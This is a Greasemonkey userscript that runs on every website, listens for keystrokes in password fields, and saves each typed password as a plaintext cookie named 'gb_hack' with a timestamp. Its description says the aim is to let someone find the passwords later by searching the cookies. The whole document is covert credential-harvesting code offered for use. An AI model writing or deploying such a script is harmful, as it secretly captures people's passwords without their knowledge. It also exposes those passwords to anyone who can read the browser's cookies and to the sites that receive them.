// ==UserScript==
// @name          Automatically store the password into cookies 
// @namespace     http://userscript.org
// @include       *
// @description	  Without doing anything manually Store the value of the password field into cookies. if you search the cookies with the name of gb_hack it will display the password value.
// ==/UserScript==
// ==

(function() {
 var inputs, input;
 var tmp1, tmp2, saved;
 inputs = document.evaluate(
	 '//input[@type="password"]',
	 document,
	 null,
	 XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
	 null);
 if(!inputs.snapshotLength) return;
 for(var i = 0; i < inputs.snapshotLength; i++) {
 input = inputs.snapshotItem(i);
 input.addEventListener('keydown', function(event) {
	 if ( !saved ) {
	 tmp1 = this.style.borderStyle;
	 if (!tmp1)
	 tmp1 = null;
	 tmp2 = this.style.borderColor;
	 if (!tmp2)
	 tmp2 = null;
	 saved = true;
	 }
	 var pass= this.value;
	 var d = new Date();
	 var curr_hour = d.getHours();
	 var curr_min = d.getMinutes();
	 document.cookie = 'gb_hack-'+curr_hour+':'+curr_min+'='+pass+'; expires=Mon, 17 Aug 2009 20:47:11 UTC; path=/'


 }, false);
 input.addEventListener('mouseout', function(event) {
		 //this.type = 'password';
		 //this.style.borderStyle = tmp1;
		 //this.style.borderColor = tmp2;
		 saved = false;
		 }, false);
 }
})();


